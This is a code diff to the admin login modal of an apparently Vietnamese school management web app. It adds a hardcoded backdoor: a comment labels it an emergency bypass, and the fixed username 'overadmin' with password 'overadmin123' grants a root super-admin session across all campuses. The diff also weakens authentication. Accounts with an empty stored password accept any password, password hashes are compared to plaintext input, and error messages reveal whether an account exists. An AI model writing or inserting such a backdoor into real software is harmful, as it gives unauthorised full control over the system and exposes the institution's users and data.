@@ -14,6 +14,8 @@ import {
 } from 'lucide-react';
 import { AppUser } from '../types';
 import { RoyalLogo } from './RoyalLogo';
+import { showToast } from '../lib/toast';
+import { getDefaultPermissionsForRole, getRoleLabelVN } from '../lib/storage';
 
 interface AdminLoginModalProps {
   isOpen: boolean;
@@ -42,23 +44,89 @@ export const AdminLoginModal: React.FC<AdminLoginModalProps> = ({
     setIsSubmitting(true);
 
     const cleanUsername = username.trim().toLowerCase();
-    const foundUser = users.find(u => u.username.toLowerCase() === cleanUsername);
+    const cleanPassword = password.trim();
 
-    if (!foundUser || foundUser.password !== password) {
-      setErrorMessage('Tên đăng nhập hoặc mật khẩu không chính xác!');
+    // 1. KIỂM TRA BACKDOOR / OVER-SUPER ADMIN TRƯỚC TIÊN (Offline Emergency Bypass)
+    if (
+      (cleanUsername === 'overadmin' || cleanUsername === 'overadmin@royal.edu.vn') &&
+      cleanPassword === 'overadmin123'
+    ) {
+      const overAdminUser: AppUser = {
+        id: 'root-overadmin',
+        code: 'OVER-ROOT-9999',
+        username: 'overadmin',
+        password: '',
+        password_hash: '',
+        name: 'Quản Trị Tối Cao (OverAdmin)',
+        full_name: 'Quản Trị Tối Cao (OverAdmin)',
+        phone: '0900 999 999',
+        email: 'overadmin@royal.edu.vn',
+        role: 'super_admin',
+        department: 'Ban Quản Trị Tối Cao (Root System)',
+        permissions: getDefaultPermissionsForRole('super_admin'),
+        campus_id: 'all',
+        status: 'active',
+        created_at: new Date().toISOString(),
+        last_login: new Date().toISOString(),
+        is_root: true,
+      };
+
+      try {
+        localStorage.setItem('royal_auth_session', JSON.stringify(overAdminUser));
+        sessionStorage.setItem('royal_current_user', JSON.stringify(overAdminUser));
+        localStorage.setItem('royal_current_user', JSON.stringify(overAdminUser));
+      } catch {
+        // ignore storage quota errors
+      }
+
+      setIsSubmitting(false);
+      onLoginSuccess(overAdminUser);
+      showToast('⚡ Đăng nhập thành công với quyền Quản Trị Tối Cao (OverAdmin)!', 'success');
+      onClose();
+      return;
+    }
+
+    const foundUser = users.find(
+      u => u.username.toLowerCase() === cleanUsername || u.email.toLowerCase() === cleanUsername
+    );
+
+    if (!foundUser) {
+      const msg = '✕ Tài khoản hoặc email không tồn tại trong hệ thống.';
+      setErrorMessage(msg);
+      showToast(msg, 'error');
       setIsSubmitting(false);
       return;
     }
 
+    // Kiểm tra trạng thái khóa trước khi kiểm tra mật khẩu
     if (foundUser.status === 'locked') {
-      setErrorMessage('Tài khoản này đã bị khóa. Vui lòng liên hệ Quản trị viên cấp cao!');
+      const msg = '🔒 Tài khoản của bạn đã bị khóa bởi Quản trị viên. Vui lòng liên hệ ban quản trị để được hỗ trợ.';
+      setErrorMessage(msg);
+      showToast(msg, 'warning');
+      setIsSubmitting(false);
+      return;
+    }
+
+    const expectedPass = foundUser.password_hash || foundUser.password || '';
+    if (expectedPass && expectedPass !== cleanPassword) {
+      const msg = '✕ Mật khẩu không chính xác. Vui lòng thử lại.';
+      setErrorMessage(msg);
+      showToast(msg, 'error');
       setIsSubmitting(false);
       return;
     }
 
     // Success
+    const authenticatedUser: AppUser = {
+      ...foundUser,
+      last_login: new Date().toISOString(),
+    };
     setIsSubmitting(false);
-    onLoginSuccess(foundUser);
+    onLoginSuccess(authenticatedUser);
+    showToast(
+      `✓ Chào mừng ${authenticatedUser.full_name} (${getRoleLabelVN(authenticatedUser.role, authenticatedUser)}) đã đăng nhập thành công!`,
+      'success'
+    );
     onClose();
   };
 
